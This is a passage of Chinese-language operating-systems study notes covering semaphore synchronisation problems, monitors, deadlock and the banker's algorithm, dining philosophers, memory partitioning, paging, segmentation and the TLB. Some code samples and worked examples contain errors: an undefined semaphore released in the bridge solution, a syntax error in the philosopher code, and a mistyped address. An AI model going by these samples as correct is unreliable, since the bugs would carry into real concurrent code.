P(readCountMutex);</span><br><span class="line">    readCount--;</span><br><span class="line">    <span class="keyword">if</span>(readCount == <span class="number">0</span>) V(wMutex)<span class="comment">//解开写锁</span></span><br><span class="line">    V(readCountMutex);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">wirter</span><span class="params">()</span>&#123;</span><br><span class="line">    P(wrMutex); <span class="comment">//读者和写者串行</span></span><br><span class="line">    p(wMutex);</span><br><span class="line">    <span class="comment">// 写入</span></span><br><span class="line">    V(wMutex);</span><br><span class="line">    V(wrMutex);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>例题 1：</p><p>有一座东西方向的独木桥，桥很窄只能单向通行，而且承载能力有限，最多 4 个人同时在桥上。当某一方向有行人过桥时，另一方向行人必须等待。东、西两端各有若干行人在等待过桥。请用 P、V 操作来实现东西两端行人过桥问题。</p><p>这是需要公平地过桥，两边地人互斥而且各自可以并发。每一边需要等另外一边的人通过才能开始。考虑进程之间的通信，需要的信息如下</p><ol><li>东西两个方向，需要互斥锁，只能走一个方向。</li><li>东西两个方向都需要自己的数量锁，防止并发造成 count 修改和读取不一致。</li><li>东西两个方向需要表示自己的数量。</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> countA = <span class="number">0</span>, countB = <span class="number">0</span></span><br><span class="line">semaphore lockCountA = <span class="number">1</span>, lockCountB = <span class="number">1</span>, mutex = <span class="number">1</span>, count = <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">eastToWest</span><span class="params">()</span>&#123;</span><br><span class="line">    P(lockCountA);</span><br><span class="line">    countA++;</span><br><span class="line">    <span class="keyword">if</span>(countA==<span class="number">1</span>) P(mutex);</span><br><span class="line">    V(lockCountA);</span><br><span class="line">    P(count);</span><br><span class="line">    <span class="comment">//过桥</span></span><br><span class="line">    V(count);</span><br><span class="line">    P(lockCountA);</span><br><span class="line">    countA--;</span><br><span class="line">    <span class="keyword">if</span>(countA==<span class="number">0</span>) V(mutex);</span><br><span class="line">    V(lockCountA);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">westToEast</span><span class="params">()</span>&#123;</span><br><span class="line">    P(lockCountB);</span><br><span class="line">    countB++;</span><br><span class="line">    <span class="keyword">if</span> (countB==<span class="number">1</span>) P(mutex);</span><br><span class="line">    V(lockCountB);</span><br><span class="line">    P(count);</span><br><span class="line">    <span class="comment">//过桥</span></span><br><span class="line">    V(count);</span><br><span class="line">    P(lockCountB);</span><br><span class="line">    countB--;</span><br><span class="line">    <span class="keyword">if</span> (countB==<span class="number">0</span>) V(mutex);</span><br><span class="line">    V(mutexB);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>经验：</strong></p><ol><li>想象进程时独立个体，同类进程之间、不同类别进程之间合作需要哪些信息。</li><li>宁愿多一些信号量，尽量避免少量信号量组合使用，这样尽管精妙，但是不容易写和理解。</li><li>以上的例子都是可以拓展的，进程之间通过信号量同步，进程内部可以用更小的协程等同步，然后把每个小部分都视作对象，就构建并发的高性能程序了。</li></ol><h3 id="管程">管程</h3><p>管程是一个程序设计语言结构，采用了<strong>集中式</strong>的进程同步方法，提供了与信号量同样的功能，但更易于控制。这里强调「集中式」，是因为信号量的操作<strong>分散</strong>在各个进程种，代码维护和心智负担都比较大。</p><p>管程定义了数据通信的数据结构和并发控制的操作（比如阻塞、接触阻塞、队列长度控制），并且<strong>局部的数据只能被管程访问</strong>，这样完成通信数据和局部数据的区分。同一时刻，<strong>只能有一个进程再管程中执行</strong>，其他调用管程的进程都会被阻塞，直到这个进程阻塞或者退出。这样实现了临界资源的互斥访问。</p><p>管程需要<strong>条件变量</strong>实现队进程的管理，因为管程中只能由一个进程执行，如果进程到达顺序不对，那么就不满足条件变量，进程就会阻塞。这时管程的调用权就交给了其他进程，直到另外的进程满足了条件变量，才能顺利执行。<strong>管程中的条件变量是同步的</strong>，因此由于其他进程修改了条件变量，这样被阻塞的进程也可以解除阻塞继续执行。这样，就完成了进程之间的同步。</p><p>管程中最常见的操作就是阻塞和解除阻塞：</p><ul><li>cwait©：调用进程的执行在条件 c 上阻塞，管程可供其它进程使用。</li><li>csignal©：恢复在条件 c 上阻塞的一个进程，若不存在阻塞进程，则什么都不做。</li></ul><h3 id="消息传递">消息传递</h3><p>我们之前都是直接默认了信号量在不同进程中是同步的，用来实现互斥或者同步。这样传递消息的方式，具有一些规律和模式。这一小节我们就是学习消息传递的基本原理。</p><p>消息传递由两条基本原语（原语是指<strong>由若干条指令组成的程序段，用来实现某个特定功能，在执行过程中不可被中断</strong>）：发送和接收。简单的说就是来自谁、发给谁，还有一些控制信息等。</p><img src="http://cdn.blog-blockchain.xyz/202302051646948.png" alt="image-20230205164621777" style="zoom:67%;" /><p>上图的消息的数据结构中可以看到一些参数，特别是源 ID 和发送 ID，它们的确定的方式，在不同场景下也不同。<strong>直接寻址</strong>时直接包含目标程序 ID，接收报文时根据需要选择是否要指明源程序 ID。<strong>间接寻址</strong>时消息会发送到公共的队列，然后接收的进程从公共队列中取走消息。</p><p>对于发送消息的进程，在发送消息之后可能阻塞，也可能不阻塞，继续执行。对于接收消息的进程，可能必须等待消息到达才能解除阻塞，也可能不接收消息直接执行。总的来说，有以下 3 种模式：</p><ol><li><strong>阻塞发送，阻塞接收</strong> 。发送者和接受者都阻塞，直到完成消息投递。一般需要进程紧密地同步时，比如流水线调度，会采用这种模式。</li><li>**不阻塞发送，阻塞接收 **。发送者不阻塞，但是接收者阻塞直到请求的消息到达。这是最常见的请求的模式。</li><li>**不阻塞发送，不阻塞接收 **。这就是各自执行各自的。</li></ol><h2 id="死锁">死锁</h2><p>进程同步的小节已经介绍过死锁了，当一组进程中的每个进程都在等待某事件，而只有同组进程中阻塞的其他进程能够促发该事件时，死锁发生。比如进程之间循环等待，或者内存不足，各自执行一般后阻塞。</p><p>严格的说，死锁的发送必须具备一些条件。必要条件：</p><ul><li>互斥。存在资源是临界资源，一次只有一个进程可以使用这个资源。</li><li>占用等待。当进程等待其他资源时，继续占有已经分配的资源。</li><li>不可抢占。不能强行抢占进程已经占有的资源。</li></ul><p>这些都是容易理解的，必须要存在临界资源才会造成等待，等待的时候如果释放资源或者资源被抢占，也是无法发生死锁的。有个充分条件则是<strong>循环等待</strong>：存在一个闭合的进程链，每个进程至少占有此链中下一个进程所需的一个资源。</p><h3 id="死锁预防">死锁预防</h3><p>死锁预防是指<strong>通过不满足上述三个条件</strong>防止死锁的发生。死锁的避免是指<strong>允许上述三个条件，但是通过设计不发生死锁</strong>。</p><p>互斥这个条件无法禁止，因为有些资源只能被独占。占用等待则可以<strong>要求进程一次性请求所有资源，并阻塞这个进程直到所有资源请求能够满足</strong>。但是，得到所有资源才开始执行，效率很低，而且某些进程执行时不知道需要哪些资源。</p><p>为了改善不可抢占的条件，就可以要求<strong>一个占有某些资源的进程进一步申请资源时若被拒绝，则释放最初占有的资源，或者要求占用自己需要的资源的进程释放资源给自己用</strong>。但是资源的状态如果不容易保存的话，会造成其他的程序中断，可能不得不重新执行被中断的进程。</p><p>从防止循环等待的角度说，可以把资源排序，申请资源的进程，必须先按照资源的序号申请，比如申请了 5 号资源就不能回过头申请 4 号资源。这样就避免了资源的冲突，但是显然申请资源的顺序可能和进程需要请求的资源的顺序不一样，这样需要额外的处理，效率较低。</p><h3 id="死锁避免">死锁避免</h3><p>死锁的避免是指<strong>允许上述三个条件，但是通过设计不发生死锁</strong>。一般有两种办法：</p><ol><li>资源分配拒绝。若一个进程增加的资源请求会导致死锁，则不允许这一资源分配。</li><li>进程启动拒绝。若一个进程请求会导致死锁，则不启动该进程</li></ol><p>简单的说，就是动态地检测，避免资源竞争地发生。比较典型的算法是<strong>银行家算法</strong>，它的基本思想是当进程申请资源时，必须保证分配出去之后，系统还是处于<strong>安全状态</strong>。否则就不分配，阻塞这个申请资源的进程。这里的「安全状态」指至少有一个资源分配的序列（表示进程申请资源顺序）不会导致死锁，能够让所有进程运行结束。<strong>安全状态一定不会发生死锁，不安全的状态不一定会发生死锁</strong>。</p><p>银行家算法需要使用到如下的数据结构：</p><ul><li>声明需要资源的矩阵（C 矩阵）。表示每个进程需要每种类型的资源的数量。</li><li>分配矩阵（A 矩阵）。表示当前每个进程分配到的资源的数量。</li><li>C-A 矩阵。表示每个进程还需要的资源的数量。</li><li>资源向量。表示当前系统拥有的每类资源的数量。</li><li>可用资源向量。表示当前还可以分配的每类资源的数量。</li></ul><img src="http://cdn.blog-blockchain.xyz/202302062013948.png" alt="image-20230206201304855" style="zoom: 80%;" /><p>根据逻辑和上述原理，可以发现分配矩阵中每类资源的和就是已经分配出去的资源数量，相当于资源向量减可用资源向量。图上的所有信息，就是初始的系统状态。</p><p>每次更新时，<strong>可用资源向量（的每个元素）必须大于 C-A 矩阵中的某个进程</strong>，这样才能让一个进程获得所需的所有资源。但是可能出现有多个满足条件的进程，这就像一棵树一样，有多条路径。就是通过这样类似深度优先搜索的方法，找到一条可以遍历每个进程一次的路径。例如上图只有 P2 满足条件，当 P2 运行结束后，状态如下图。</p><p>记住需要更新分配矩阵、C-A 矩阵、可用资源向量。需求矩阵对应进程需要的资源设置为 0。</p><img src="http://cdn.blog-blockchain.xyz/202302062024843.png" alt="image-20230206202446750" style="zoom:80%;" /><p>可以知道都可以分配了，不妨选择 P1，P1 运行结束后如下</p><img src="http://cdn.blog-blockchain.xyz/202302062028648.png" alt="image-20230206202847552" style="zoom:80%;" /><p>之后的选择完全是类似的，P2, P1, P3, P4 这个顺序是安全的，其他的顺序，比如 P2, P1, P4, P3 也是安全的。需要注意的是，如果进程并不一次性分配的需要所有资源，这也是可以的，但是需要满足分配之后，存在一个进程可以分配得到所有它需要的资源。比如，下图中，如果给 P1 分配了(1, 0, 1)的资源，那么后续就无法分配了，没有一个进程可以执行结束，这是不允许的，会拒绝分配。</p><img src="http://cdn.blog-blockchain.xyz/202302062107629.png" alt="image-20230206210720509" style="zoom:80%;" /><p>根据上面的例子可以发现，死锁避免采用的银行家算法，并没有改变三个必要条件中的要求，而是通过策略控制资源分配给进程的多少和顺序，从而达到死锁避免。这样做的限制更少，而且更加灵活。但是，这需要每个进程需要在执行前声明自己需要的所有资源有哪些，而且进程之间是独立的，不能有执行顺序的要求。特别是频繁的检测会消耗处理器很多的时间。</p><p>如果发现不存在安全的路径，通常有三种办法：</p><ul><li>撤销进程。撤销被永久阻塞的进程，直到不发生死锁。</li><li>回退。把进程的状态回滚到之前的检查点，从检查的开始重新执行。</li><li>抢占。通过抢占资源，来保证某个进程能顺利执行。</li></ul><h3 id="哲学家就餐问题">哲学家就餐问题</h3><p>哲学家就餐问题是经典的死锁问题。场景如下 5 把叉子，五份食物，每个人必须要两把叉子才能进食。显然，如果每个人都拿起了一把叉子，就每个人都没办法进食。直观的想法是，如果一个人拿不到左边或者右边的叉子，那么就把手上的另一个叉子也放下，让其他人使用。但是，没有规则的互相谦让，可能让每个人都无法进食，形成活锁。</p><img src="http://cdn.blog-blockchain.xyz/202302062120273.png" alt="image-20230206212059064" style="zoom: 50%;" /><p>所以我们需要给资源建立偏序关系，让资源按照一定的顺序申请和释放。</p><p>方案一：就餐前，先取用编号较低的餐叉，再取用编号较高的餐叉。这样就会有同一个叉子被两个人竞争，导致至少一个人由于竞争失败，不去取另外一个叉子。这样就可以保证有一个人能拿到两把叉子。</p><p>方案二：奇数号的哲学家必须首先拿左边的餐叉，偶数号的哲学家必须首先拿右边的餐叉。同样的道理。</p><p>方案三：最多允许四个人同时进食，这样至少一个人会拿到两把叉子。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">semaphore fork[<span class="number">5</span>] = &#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>&#125;, room = <span class="number">4</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        cobegin &#123;philosopher(<span class="number">0</span>); philosopher(<span class="number">1</span>); philosopher(<span class="number">2</span>); philosopher(<span class="number">3</span>); philosopher(<span class="number">4</span>);&#125;coend;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">philosopher</span><span class="params">(<span class="type">int</span> i)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">        wait(room);                             <span class="comment">//占据就餐位置</span></span><br><span class="line">        wait(fork[i]);                           <span class="comment">//拿起左边的叉子</span></span><br><span class="line">        wait(fork[(i+<span class="number">1</span>)%<span class="number">5</span>]);               <span class="comment">//拿起右边的叉子</span></span><br><span class="line">        eat();</span><br><span class="line">        signal(fork[(i+<span class="number">1</span>)%<span class="number">5</span>]);            <span class="comment">//放回右边的叉子</span></span><br><span class="line">        signal(fork[(i]);                        <span class="comment">//放回左边的叉子</span></span><br><span class="line">        signal(room);                          <span class="comment">//释放就餐位置</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>哲学家就餐问题，实际上代表着对每一个进程，临界资源要么全部分配到位或者一个资源都不分配。</p><h1>基本内存管理</h1><p>这一部分的前提是，要求默认读者清楚计算机存储的基本结构。对于存档的存储，是不能直接访问的。ROM 这些是可以作为永久性记忆的，可以用来存储。对于快速的临时存储，按照 CPU 读取的亲近关系，可以分成寄存器、Cache、主存（内存）。它们的速度是从金字塔顶端下降的，但是容量是逐渐上升。</p><img src="http://cdn.blog-blockchain.xyz/202302062318849.png" alt="image-20230206231848772" style="zoom: 80%;" /><h2 id="内存管理的关注点">内存管理的关注点</h2><p>内存管理需要关注<strong>重定位</strong>、<strong>保护</strong>、<strong>共享</strong>、<strong>逻辑组织方式</strong>、<strong>物理组织方式</strong>。</p><p>重定位是指编程时程序员设置的内存位置和实际程序运行的位置的映射，程序员不知道系统可能在哪些位置有哪些程序，所以就需要重定位技术，让程序按照内存空闲情况，重新定位到内存中不同的位置。重定位的方式，其实就是地址转化的方式，也会影响进程寻址的方式。</p><p>保护是指进程以外的其他进程中的程序不能未经授权地访问（进行读操作或写操作）该进程的内存单元。这是非常重要的技术，如果黑客可以访问并修改 root 用户所在的内存，刻意修改内存，可能会造成严重后果。所以，windows 也推出了让内存中程序的位置不可预测的功能。</p><p>共享是指多个进程可以执行同一个程序，多个进程拥有同一个副本，通过共享可以大大节省内存。</p><p>逻辑组织方式是应用程序访问内存时，看到的内存的组织方式。属于软件层面的支持。</p><p>物理组织方式是硬件层面的编码方式，它和逻辑组织方式之间的转化由操作系统完成，而不是由程序员完成。最典型的就是虚拟内存和物理内存之间的映射方式。</p><p>高级语言需要转化成实际的可以运行的程序，一般需要对单个文件的源代码进行编译，然后链接编译后的单个模块和库函数等形成一个完整程序。之后才能装入内存，程序直接包含了静态库，但是动态库需要在程序装入时跟着装入。</p><img src="http://cdn.blog-blockchain.xyz/202302062323258.png" alt="image-20230206232353031" style="zoom: 50%;" /><p>在装入主存的过程中，程序内的地址将会发生重定位，将逻辑地址转化成内存中的物理地址。</p><h2 id="加载过程">加载过程</h2><p>装入主存的过程，根据逻辑地址和物理地址的映射关系，可以分成：绝对加载方式、静态重定位方式、动态重定位（运行时）方式。</p><p><strong>绝对加载方式</strong>逻辑地址和物理地址完全相同，<strong>编译时就确定了</strong>程序将运行在内存中的具体的位置，在程序内可能用一些符号地址代替地址的编号，编译时就会转化成绝对地址。非常显然的是，内存中程序的安排必须是完全确定的，也就是这样的系统是专用的。其次，多处理器系统在运行这个程序产生的多个进程时，可能会造成存储位置冲突。</p><p><strong>静态重定位</strong>编译时采用相对地址的方式，编译器假设加载是从 0 地址开始的，<strong>加载时</strong>程序代码内的所有地址拥有相同的偏移量，运行之后地址不能改变。由于运行后地址固定，不方便重新分配内存，导致内存空余的间隙不能充分利用。·</p><p><strong>动态重定位</strong>的地址转换过程发生在<strong>运行时</strong>，为了不影响运行速度，一般使用硬件支持。这样程序不必连续的存放在内存中，而且可以共享某一段内存，这也是现代计算机的主流方式。缺点也显然，就是更加复杂，地址转化的计算也更复杂。</p><h2 id="链接过程">链接过程</h2><p><strong>静态链接</strong>在<strong>程序运行之前</strong>，先将各目标模块及它们所需的库函数，链接成一个完整的装配模块。静态链接时需要考虑各个模块的地址的统一、外部引用地址的统一。显然，这样编译出来的程序会很大，因为需要的东西都塞进去了，也不方便对每个模块升级，而且链接的库函数在实际执行中，可能不会全部同时用到。但是，这样做也避免了一些环境依赖。</p><p><strong>加载时动态链接</strong>待加载的模块在加载内存时，如果该模块中有到外部模块的引用，加载程序将查找这些模块并加载内存，并把这些引用修改为相对应用程序模块开始处的相对地址。各个模块相对独立，可以升级，不同程序也可以共享库函数。但是，<strong>加载确定之后，模块是不能变动的</strong>。</p><p><strong>运行时动态链接</strong>在程序执行中需要某目标模块时，由操作系统去找到该模块并将之加载内存，随后把它链接到调用者模块上。这是很主流的方式，比如 windows 的 ddl 文件就是一些用于加载时动态链接的库函数。模块就是动态的可拆卸的，可以加快加载过程，也可以节省内存空间。</p><h2 id="内存分区">内存分区</h2><p>使用过的内存分区技术如下，从开始的简单分区，到后来的分页分段和虚拟内存方案，体现了技术进步的过程。我们在这节只介绍前面两种，段和页将在虚拟内存管理中学习。</p><table><thead><tr><th><strong>内存管理技术</strong></th><th><strong>使用</strong></th></tr></thead><tbody><tr><td>固定分区</td><td>IBM MFT</td></tr><tr><td>动态分区</td><td>IBM MVT</td></tr><tr><td>简单分页</td><td>没有使用，但为虚存分页的基础</td></tr><tr><td>简单分段</td><td>没有使用，但为虚存分段的基础</td></tr><tr><td>虚存分页</td><td>现代操作系统广泛实际使用</td></tr><tr><td>虚存分段</td><td>现代操作系统广泛实际使用</td></tr></tbody></table><p><strong>固定分区</strong>的分区数量固定，操作系统占据内存的固定部分，其他每个分区装入一个进程。分区的大小肯能相等也可能不相等。如果分区大小相等，那么程序可能无法恰好占满分区，导致内存中有很对碎片，浪费空间。分区大小不等，则需要一定的算法进行分配。</p><p><strong>动态分区</strong>的分区大小和数量都不固定，可以按照进程的需求分配内存空间。但是由于进程在内存中的分配和取消分配，也会产生大量内存碎片，例如下图进程 2 退出后的空隙就无法被填满。因此，提出了压缩技术，通过移动进程，使得进程占用的空间连续。但是这样也浪费了处理器的时间。</p><img src="http://cdn.blog-blockchain.xyz/202302081426305.png" alt="image-20230208142649104" style="zoom:50%;" /><p>简要介绍动态分区的算法：</p><ol><li>首次匹配。从头开始扫描内存，选择大小足够的第一个可用块。</li><li>下次匹配。从上一次放置的位置开始扫描内存，选择下一个大小足够的可用块。</li><li>最佳匹配。选择空间大小与需求最接近的空闲块分配。</li><li>最差匹配。选择满足需求的最大的空闲分区分配。</li></ol><p><strong>伙伴系统</strong>是固定分区和动态分区的折中方案。简单的说，分区的大小既不是精确按进程的需要决定，也不是按照预先确定的固定方式决定，而是按照 2 的幂次分配空间，找到满足进程需要的最小的 2 的幂次的空间。</p><img src="http://cdn.blog-blockchain.xyz/202302091312364.png" alt="image-20230209131214246" style="zoom: 50%;" /><h2 id="分页">分页</h2><p>（这一小节，如果完全没有接触过虚拟内存，可能需要较长时间理解）</p><p>页是进程中的块，页框是内存中的块。因此，进程和内存都分成了大小相等的块，便于映射和寻址。页和页框之间的映射，就可以在逻辑上进程的内存空间连续，物理存储上可以分开。这样就非常灵活，也避免了内存的小碎片的产生，实现了内存的离散分配。</p><p>页和页框的对应关系，由页表储存着，处理器会访问页表，用硬件的方式将页表项中的逻辑地址，转换成物理地址。页表项的基本结构如下图，页号表示第几个页，业内偏移量则是在一个页内的地址偏移量，这样就可以定位到某一个字节。</p><img src="http://cdn.blog-blockchain.xyz/202302091327454.png" alt="image-20230209132730396" style="zoom:50%;" /><p>逻辑地址到物理地址的转换过程非常的直接，偏移量部分不变，逻辑地址会根据页表查找到页框号。这样页框号和偏移量拼接起来，就是物理地址了。</p><img src="http://cdn.blog-blockchain.xyz/202302091340315.png" alt="image-20230209134002233" style="zoom:50%;" /><p>页表储存在内存中，进程管理块（PCB）记录着页表的起始地址，页表寄存器存放当前运行进程的页表的起始地址。我们看一个示例，内存容量共 256K，存储块的大小为 1K，那么就有 256 个页框。第 0 ～ 4 块为操作系统所使用。现有 2 个用户作业，作业 1 和作业 2，其逻辑地址空间分别占 2k 和 2.5k。那么就分别需要 2 页和 3 页。那么一种可能的内存布局方式，就如下图所示。进程左边的数字表示地址，页表中存在页号到页框号的对应。</p><img src="http://cdn.blog-blockchain.xyz/202302091344951.png" alt="image-20230209134444852" style="zoom:50%;" /><p>对于虚拟地址 09C4H（注意末尾的 H 表示十六进制），二进制为 0000 1001 1100 0100B（末尾 B 表示二进制）。注意虚拟地址的页的数量不一定等于页框的数量，一般是会大于，也有可能小于。所以虚拟地址页号占几位一般是通过偏移量和机器字长计算的。假设这是 16 位的机器，那么低 10 位是偏移量（对应页的大小），29C4H，高 6 位 2H 是页号，对应页框号 10，所以物理地址为 18 位 00 0010 1001 1100 0100.</p><h2 id="分段">分段</h2><p>一个程序可以分成大小不等的几个段，每个段都从 0 开始编址，并占用一段连续的地址空间。逻辑地址则由两部分构成，段号+段内偏移量。<strong>分段可以被程序员控制，但是分页不行</strong>，这样可以让程序运行时实现模块化。分段也可以避免内存的内部碎片，段之间可以动态连接。</p><img src="http://cdn.blog-blockchain.xyz/202302091542808.png" alt="image-20230209154241749" style="zoom:50%;" /><p>因为段的大小不等，所以逻辑地址和物理地址之间的对应关系比较复杂，但是寻址过程和分页是完全相同的。</p><p>分页存储管理系统不易实现「共享」，不支持「运行时动态链接」，而分段系统易于实现「共享」和「动态链接」。</p><h1>虚拟内存管理</h1><p>虚拟内存最主流的就是分段和分页，他们都需要硬件支持，而且操作系统必须实现管理页和段的软件算法。虚拟内存是指外存（比如机械硬盘、固态硬盘）可以看作是内存的一部分来寻址，这样实现了对内存的拓展。</p><p>需要注意，分段和分页<strong>不需要一个程序的所有页或者段都在内存中</strong>，只需要加载正在运行的部分即可，这也是非常重要的节省内存空间的方法。<strong>分段或分页式的进程执行过程</strong>：进程在执行过程中，会从程序的入口加载若干块进入内存，当前驻留在内存中的部分叫做<strong>驻留集</strong>。如果逻辑地址对应的物理地址上的内容标记为失效，那么就会产生中断，进程进入阻塞阶段。接着，操作系统就会生成磁盘 IO 请求，在这个过程中，会调度其他进程执行，当磁盘 IO 完成之后，内存上就有了需要的资源，被阻塞的进程进入就绪状态。</p><p>按照上面的执行过程，可以发现找到尽可能的减少缺页的发生的方法，是非常重要的。如果外存加载进内存和释放的过程太频繁，就会造成抖动，大量缺页。经典的办法是利用<strong>局部性原理</strong>，短时间内程序在外存中的存储一般是连续的，也就是说具备集簇倾向。那么从外存加载数据时，就可以预测下一个需要的数据，在已经加载的数据的附近。</p><p>基于虚拟内存技术，内存可以实现拓展，运行更多的进程，调度效率高。分段分页即使可以实现运行时按需调配资源，可以提高内存利用效率。</p><img src="http://cdn.blog-blockchain.xyz/202302091628402.png" style="zoom: 50%;" /><h2 id="分页细节">分页细节</h2><p>之前介绍的分页，只是提到页表中逻辑地址到物理地址的对应关系，而实际的使用中还存在一些常用的优化技术。例如增加控制位，存在位 P 表示对应的页是否在内存中，M 表示距离上次装入内存中的页框的内容是否修改过。</p><img src="http://cdn.blog-blockchain.xyz/202302091655430.png" alt="image-20230209165541374" style="zoom:50%;" /><p>由于虚拟内存可以非常大，远大于内存，所以页表也可能很大，因此<strong>页表会存储在虚拟内存中</strong>。比如一个虚拟空间 32GB，每个页大小 1KB，那么需要 2^(35 - 10)=2^25 的页表项，非常大。</p><p>页表大了起来，检索速度也会变慢，因此提出了多级页表的方式，加快速度。以两级页表为例，第一层页表的每一项，指向第二层的一个页表。其中第一层页表又被叫做页目录。<strong>总共的页表项的数量是每一层级页表项数量的乘积</strong>。如下图，假设每个页表项为 4 字节，页大小 4KB，那么 4GB 的虚拟地址空间（也叫做用户地址空间）就需要 2^20 的页表项，需要 4MB 的页表。为了加快检索，而不用遍历那么多页表项去寻找匹配的虚拟地址，就采用了根页表，同时页表可以存放在虚拟内存中。</p><img src="http://cdn.blog-blockchain.xyz/202302101341523.png" alt="image-20230210134104435" style="zoom:50%;" /><p>根页表的每一项的数据结构和普通页表类似，也是通过根页表的编号（也被称作页目录号）找到对应的页号（比如上图 4MB 的页表）,然后根据偏移地址确定具体对应页框号的页表项。</p><img src="http://cdn.blog-blockchain.xyz/202302101347397.png" alt="image-20230210134758343" style="zoom:50%;" /><p>如果从虚拟地址的角度出发，那么就可以将虚拟地址分成 3 部分，第一个部分是根页表的项的编号，第二部分是第二级页表项的编号，第三部分是虚拟地址。同时第二部分也是根页表中的页内偏移量。也就是，单层页表的页表编号被拆分成两部分了。</p><img src="http://cdn.blog-blockchain.xyz/202302101351608.png" alt="image-20230210135159504" style="zoom:50%;" /><p>另外一种优化技术是<strong>倒置页表</strong>，之前提到每个进程需要分配一个页表，所有进程的 PCB 记录着页表的起始地址。当进程很多时，多个页表也会占据大量内存空间。因此，通过虚拟地址寻找物理地址的数据的方式做了一些更改，首先计算 <code>HASH(逻辑页号+进程ID)</code>，然后在哈希表中通过链接指针找到（类似链表的方式）找到对应的一项，然后在这一项中获得页框号。这个哈希表就叫做倒置页表。</p><img src="http://cdn.blog-blockchain.xyz/202302101414269.png" alt="image-20230210141445156" style="zoom: 50%;" /><h2 id="TLB-快表">TLB 快表</h2><p>之前的介绍中，通过页表查询的方式，往往需要两个步骤，首先是根据逻辑页号读取虚拟内存中的页表项，然后通过页表项中的物理页框号读取内存中的数据。实际上，我们可以通过高速缓存的方式提高速度。快表转换过程如下：一个虚拟地址寻找物理地址时，首先检查 TLB 中是否有页表项，如果有则直接得到物理页框号。如果没有，那么需要寻找到这个进程所在的页表，然后找到页表中的页表项，得到物理页框号，最后更新 TLB。</p><img src="http://cdn.blog-blockchain.xyz/202302101437066.png" alt="image-20230210143708957" style="zoom:50%;" /><p>因此，完整的虚拟地址到物理地址的转过过程如下图</p><img src="http://cdn.blog-blockchain.xyz/202302101439668.png" alt="image-20230210143904578" style="zoom: 67%;" /><p>虽然 TLB 速度很快，但是空间有限。究竟哪些页表项需要放入 cache，页表项和 cache 的对应关系、更新方式等，都已经在计算机组成原理中学习过了。由于计算机操作系统的课程考核不要求这一部分，全相联、组相联这些内容暂时跳过。读者感兴趣的话，可以评论，日后我继续补充。</p><h2 id="分段和段页式">分段和段页式</h2><p>类似于分页，每个进程一个段表，段表项也有存在位（对于段是否存在内存）、修改位（上次装入后是否修改）、其他控制位、段长度、段基址。和分页不同德是，物理地址的确定是段基址加上偏移量。分段的机制每个段都有长度和基址，那么限制只能访问当前段的内存，就可以控制非法访问，实现<strong>保护</strong>。一个段可以被多个进程引用，实现<strong>共享</strong>。</p><img src="http://cdn.blog-blockchain.xyz/202302101451137.png" alt="image-20230210145129046" style="zoom:50%;" /><p><strong>段页式</strong>的方式是分段和分页的结合，虚拟地址空间（也叫做用户地址空间）被程序员分成若干段，每段划分成若干页。每个进程一个段表、每个段一个页表。段表项包含了段长和页表起始地址等信息，页表项则包含了页框号等信息。</p><img src="http://cdn.blog-blockchain.xyz/202302101458517.png" alt="image-20230210145859451" style="zoom: 50%;" /><p>具体寻址过程如下，需要注意的就是段号寻找段表项，页号寻找页表项，都是需要加法。可以看到，访问段表、访问页表、读取内存数据，至少需要访问 3 次内存。</p><img src="http://cdn.blog-blockchain.xyz/202302101501072.png" alt="image-20230210150142996" style="zoom: 50%;" /><h2 